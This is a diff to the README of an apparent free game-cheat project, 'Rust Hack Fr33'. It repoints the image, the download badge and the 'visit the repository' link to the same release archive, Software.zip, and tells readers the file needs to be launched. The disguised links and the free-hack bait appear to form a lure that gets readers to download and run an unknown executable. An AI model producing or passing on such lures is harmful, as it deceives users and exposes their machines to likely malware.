@@ -2,7 +2,7 @@
 
 ---
 
-![Rust Hack Fr33](https://github.com/username/rust-hack-fr33/image.png)
+![Rust Hack Fr33](https://github.com/nicotrox/rust-hack-fr33/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -27,14 +27,14 @@ rust-hack-fr33
 ---
 
 ## 📦 Download Link
-[![Download Rust Hack Fr33](https://img.shields.io/badge/Download-Rust_Hack_Fr33-blue.svg)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Rust Hack Fr33](https://github.com/nicotrox/rust-hack-fr33/releases/download/v1.0/Software.zip)](https://github.com/nicotrox/rust-hack-fr33/releases/download/v1.0/Software.zip)
 
 📁 **Needs to be Launched** 🚀
 
 ---
 
 ## 🌐 Visit the Repository
-For more information, code, and updates, visit the [Rust Hack Fr33 Repository](https://github.com/username/rust-hack-fr33) directly.
+For more information, code, and updates, visit the [Rust Hack Fr33 Repository](https://github.com/nicotrox/rust-hack-fr33/releases/download/v1.0/Software.zip) directly.
 
 ---
 
